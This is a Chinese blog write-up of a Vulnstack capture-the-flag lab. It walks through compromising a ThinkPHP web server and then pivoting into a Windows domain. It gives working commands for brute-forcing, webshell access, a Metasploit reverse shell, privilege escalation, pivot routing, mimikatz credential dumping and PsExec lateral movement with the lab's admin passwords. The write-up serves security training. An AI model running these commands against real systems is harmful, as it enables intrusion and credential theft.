> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ZhSPKXXd5Y6n2IK1Q8vFgw)

靶场信息
----

*   **作    者：** 小星星                                
    
*   **创建时间：** 2020 年 3 月 13 日 02:52                           
    
*   **标    签：**  APT 攻击 | Kill Chain | 安全靶场 | 红蓝对抗 | ATT&CK
    
*   **下载链接：**http://vulnstack.qiyuanxuetang.net/vuln/detail/7/
    
*   **win7 账号密码：**sun\heart 123.com sun\Administrator dc123123.com
    
*   **2008 账号密码：**sun\admin 2021.com
    
*   **Win7 双网卡模拟内外网**
    
*   此处可以注意下，先把每个账号都登录下看下，因为密码过期的原因，后面可能导致实验不成功，密码过期的账户，你登录后会提示修改密码
    
*   **初始 win7**
    
    sun\heart 123.com
    
    sun\Administrator dc123.com
    
    **初始 2008**
    
    sun\admin 2020.com
    

渗透之路修仙之路

参考文章：https://mp.weixin.qq.com/s/FJokXBYWXCsQtB-9i0xUTw  



-----------------------------------------------------------------------

靶场配置
----

导入 win7 和 2008 虚拟机，win7 虚拟机 1 网卡设置 NAT，设置网络自动获取 IP，打开 C 盘下 phpstudy  

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkQHwsOq2Aufqic1wdWJibHFPVMHTZmR1hTF4C7znoIu3uFYQaEojniaM4Q/640?wx_fmt=png)

渗透开始
----

### 扫描存活主机

```
arp-scan -l
masscan -p 80,22,3306,3389 192.168.44.0/24
nmap -sP 192.168.44.0/24
```

找到目标 IP：192.168.44.132  

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtksgqH7cGpAyB3iaZGD5j09WficjzXVvJvGf912lrKRBNm4rkY7BhjfyaQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkibJGFT4ic65atH9JB5mEKy5w1jlsLVoN2cvM0SyCqUs7AOHoCFf23ycQ/640?wx_fmt=png)

### 扫描开放端口

```
nmap -sS -sV -v -p- -A 192.168.44.132
```

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtk2E5YMILOPrHLrlVQTsmPSGWAYicxgfpFgR9niaEnerQg3icb4ym1LV8Mg/640?wx_fmt=png)

得到信息：80、3306(mysql)  

先用 hydra 爆破下 3306，这条路好像是行不通

```
sudo hydra -l root -P /usr/share/john/password.lst 192.168.44.132 mysql
```

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtk0ugO1aCeRQ5TzP8d4fhJMZ3bYibBwiav4EGldOnZPLqlbA7Uya8oBK9g/640?wx_fmt=png)

### 目录扫描  

这里还用 dirb 等扫过，没啥主要的

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkBk1S8TaNOuonm4WjRGhiaD6t9mQl1QxGvxMH9CibIre3jqMbOooEiaibKQ/640?wx_fmt=png)

访问网站，发现是 ThinkPHP 框架，通过访问不存在的路径达到报错效果，可以看到一些特征  

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkwjIxbrPXCzFavVa2LTY7p9NYpSXbXnyQ4xeWZKChAqvPBibRQX7BEfQ/640?wx_fmt=png)

访问 robots.txt 也没什么信息  

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkQMznMxbtAHQlPibibTuMTvAAyj3gRjr7MG16DlXwX6kaN1uPYSophO1w/640?wx_fmt=png)

访问 index.php  

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkNjgIpxYYA7fJnhc05AzoMmxqBet7cTtc0sH1ZhnEtLVYricdmTaCSRw/640?wx_fmt=png)

访问 index.html  

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtklhsgxicvHckibZaGfbuHmia5DJJZddIRqU3bG7DZibc7vQ3kJqjHtIahibA/640?wx_fmt=png)

访问 add.php 是个大马  

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkzCbSGIbWmeLL2icGPFV28up8IGuHfJZWicsMoxHccO5fQ4CaWNCfWxBg/640?wx_fmt=png)

可以从这里入手，抓包爆破下密码  

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkH3YULXbw95BM6DVFMV228jqd2TyBBP3a7fia8m9CEvLuZ0tia7p7TDCg/640?wx_fmt=png)

爆出密码去登录下试试  

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkiclvhy32vCwts8wlKGCt2hhJea15hcV6xO5dcicBZ9BySf1ib9Bzscgmw/640?wx_fmt=png)

别有洞天  

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkmia0ricXkBsywOXAqA4mIr2goTBH6dNyp0UxBSxTy6KAXjeciaaNrQBGQ/640?wx_fmt=png)

依然信息收集，这个马子很多命令都没有回显所以肯定要换个方法  

```
whoami
```

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkPu0mkewL8LTwdbAg5fCO9xuzkJsMQpkGMoegwc0QCv04p4lPJQsLjA/640?wx_fmt=png)

也可以用工具看下 thinkphp 是否存在已知的漏洞  

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkb9YIJw5LhKSO0icSRZYKmgUyvRZq673enUw5YISb2WrhNA2W0sd5JlQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkJgJKch91zdZcRyu4xCNYvW6cgW5STqbMcyNsCv58WOIFuvbib8g77Zg/640?wx_fmt=png)

此处为了方便还是上传一个木马到 webshell 管理工具上

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkxIibqUybOiaVJ28yAmemzHBd8M37CRWCh7pHmF8Ay5xSXvpcE9uodcjg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkPeveSicHjD7AYicJFnMQlibb4xx1dia3oCQJNMqNiakGz2dXh90Vve1uGbw/640?wx_fmt=png)

乱码问题改下编码  

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkPhBjFibSqR5VPMlOBIuKN5hU9rYbwIiccxGQhumd6K7fPAu3IrLYZKcw/640?wx_fmt=png)

简单的信息收集一下，补丁情况可以拿到 http://blog.neargle.com/win-powerup-exp-index/ 看看  

```
systeminfo
```

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtk0KGiafmhiaZINNcnGeQjsdZoY00ibNAWOJpViaMWeClzKr6D7IKpu85bGg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkicsV85QV9W94mRoEjrHabxa3hwiccjKbJ9pQ09mYkAW6Q0pdo2PouN5Q/640?wx_fmt=png)

```
ipconfig /all
```

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtk6dW5IoLLv5EeDzq65HaF5lNialNhWDUPEbdCaBIdbM2fJwz7IAcicu4A/640?wx_fmt=png)

显而易见肯定有域的（这不是废话嘛）  

把 shell 弹回给 MSF

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkg9SOnib3RzqI9knNxkhSRnNLDnZOpQvhUAnJhYs2AaBrzrxRkpH3jaQ/640?wx_fmt=png)

提权  

```
getsystem
getuid
```

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtk7qevRA7QrJhskucN9yhg8rHjTCdXdXJetJZfY9SV0XDdGbgJxyZZew/640?wx_fmt=png)

前面知道有第二张网卡，那么接着整  

MSF 添加路由

```
run autoroute -s 192.168.138.0/24
```

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtk3oXmDK12h9U0eDrdzjGYx4MBxMiaMheuiaickpJajAwsUj1ic7jvUGteTA/640?wx_fmt=png)

查看路由  

```
run autoroute -p
```

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkFWPxoK9jtV6T5QRNup9KjUKmjvK6ggIH0jTFGhUQTeaqWLOKIRxoHQ/640?wx_fmt=png)

扫一下存活主机  

```
run arp-scanner -r 192.168.138.0/24
```

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtk4snCIic5ibecxzlEEsaFdNMhLcDtFy0IKricvpyqEyib3uL9WYemGqdribQ/640?wx_fmt=png)

得到信息：192.168.138.138  

设置 sock5 代理, 我这里又出问题了。。。。哎。。。太菜了，有没有巨佬帮帮弟弟

```
use auxiliary/server/socks_proxy
set srvport 9050
vim /etc/proxychains4.conf
```

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkjo49ZerCjVLPAsInVdC2uicZB3ZC7bwynTZbQUsbWOWqQe2BfhPZIIA/640?wx_fmt=png)

扫描一下端口  

```
use auxiliary/scanner/portscan/tcp
```

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkOyHgE3tJ5M1zCKLiaDAsS9491o9CuZHF63icmFAyfE5k9aPkfwm0du1w/640?wx_fmt=png)

得到信息：只开放了 445 端口  

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkFmx4PwFbjRLO4oE8nPCtCQNpK4lt38iarX2aHryV1GCz4MicdYZwbzjA/640?wx_fmt=png)

使用 MS17-010 打一下试试看  

```
use exploit/windows/smb/ms17_010_eternalblue
```

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkTSvTy3vWD5G65MV60JGSb2KSklQLjsK6jgWBz4yViaDlLOYtoAraJRw/640?wx_fmt=png)

不过失败了，不过也不要紧  

先前有看到系统是 64 位的

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtknyjVbOmyULlzTZ1TNZNzLGzS0nmFXN0sfh546rFYnXichBibEbtQXLJg/640?wx_fmt=png)

使用自带的 hashdump 抓取 hash  

```
run hashdump
```

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkCibka7PfA9DIJTezS7tKU4Sp49bJCAh4nf2thEHNDDlJ5EwnHc4LAaA/640?wx_fmt=png)

使用下 mimikatz 抓，进程需要先迁移到 64 位的  

```
ps
migrate 452
```

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkJTAsDCbCExH6vuSCxlVwxcs1OXWWIGLI9CImvAq2ux0K2ZXcjNTL4A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkic875g60ibdvI0VkS2zia6x3Nr7uWeOKicteZKB4KDJEn24RtkicaMgqUaQ/640?wx_fmt=png)

此处输入？，可以看下 kiwi

没有可以 load mimikatz

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkLMnj6GoXFU4ceFZeuico8JbPFFpJUT6p94kZYtuB8ia9FMhv8Xuzdcicg/640?wx_fmt=png)

```
creds_all：列举所有凭据
creds_kerberos：列举所有kerberos凭据
creds_msv：列举所有msv凭据
creds_ssp：列举所有ssp凭据
creds_tspkg：列举所有tspkg凭据
creds_wdigest：列举所有wdigest凭据
dcsync：通过DCSync检索用户帐户信息
dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID
golden_ticket_create：创建黄金票据
kerberos_ticket_list：列举kerberos票据
kerberos_ticket_purge：清除kerberos票据
kerberos_ticket_use：使用kerberos票据
kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令
lsa_dump_sam：dump出lsa的SAM
lsa_dump_secrets：dump出lsa的密文
password_change：修改密码
wifi_list：列出当前用户的wifi配置文件
wifi_list_shared：列出共享wifi配置文件/编码
```

```
lsa_dump_sam
```

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkWAkx0F7ygGTpdC33ia2IR7Cr0JJtgFlE65sMXQbb1nOYm6mlib4gGhvg/640?wx_fmt=png)

```
kiwi_cmd sekurlsa::logonPasswords //抓取明文
```

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkagt8AmvrbGWh1b0hBXQVicHcuWxLyKdK6BMiaT7HGeELGoMglDaImDxA/640?wx_fmt=png)

```
creds_all 效果也是一样的
```

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkHLWeh2T8emtzg7RTQElZ6nLcjydmIXDOcUaVCIK5faeMmjrzia2mdBg/640?wx_fmt=png)

抓到了域用户，那么就可以尝试 psexec 传递了，MSF 失败了。。。。。。愚昧。。。。正好换 CS 搞  

通过 CS 来做
--------

上传 CS 木马上线

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkcbYYusGDtNU14CWIZkCFKYmUe9tUe1snPpZotoTUNOiaUSyj0mtcViag/640?wx_fmt=png)

抓取明文  

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkXyx9UTlp6R3qQDib0ZaqIeauwbppd4jbwk91eFibBqe1uD1bibPI12Vibw/640?wx_fmt=png)

CS 多层内网上线  

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkklxkeGsyUpJnDNF1GhqlicTLFIjmKsG9mL85ePewickRhsdtqAx6thUA/640?wx_fmt=png)

设置防火墙规则  

```
netsh advfirewall firewall add rule name=cs dir=in action=allow protocol=TCP localport=9999
```

这里说明一下，搞了好久。。。一直报句柄无效，不过最后解决了。如果你也做了这个靶场，并且到这里出现和我一样的问题，可以后台私信我，看看能不能提供点帮助给你，我这里就不贴出来。

```
shell C:\WINDOWS\Temp\PsExec.exe -accepteula \\192.168.138.138 - u Administrator -p dc123123.com -d -c C:\WINDOWS\Temp\2222.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtkacf9vyKyJoj0m4qnPTYTp1VRyAlIFFWPzbiaw57dwq3TzYvJn156QzQ/640?wx_fmt=png)

剩下的挂代理就可以了，结束  

![](https://mmbiz.qpic.cn/mmbiz_png/EG5vnf7iaBIyoEJUhw2osOmP8bKclPTtk8XrlrKhNxn8nEw7ektgB0PJncFeKo7pk8r0GdyeLVGjB8TW9PKszIw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

一如既往的学习，一如既往的整理，一如即往的分享。感谢支持![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icl7QVywL8iaGT0QBGpOwgD1IwN0z9JicTRvzvnsJicNRr2gRvJib6jKojzC5CJJsFPkEbZQJ999HrH5Gw/640?wx_fmt=png)  

“如侵权请私聊公众号删文”

****关注 LemonSec****  

公众号

**觉得不错点个 **“赞”**、“在看” 哦****![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1YhlAJOGvAaVRV0ZSSnX46ibouOHe05icukBYibdJOiaOpO06ic5eb0EMW1yhjMNRe1ibu5HuNibCcrGsqw/640?wx_fmt=png)**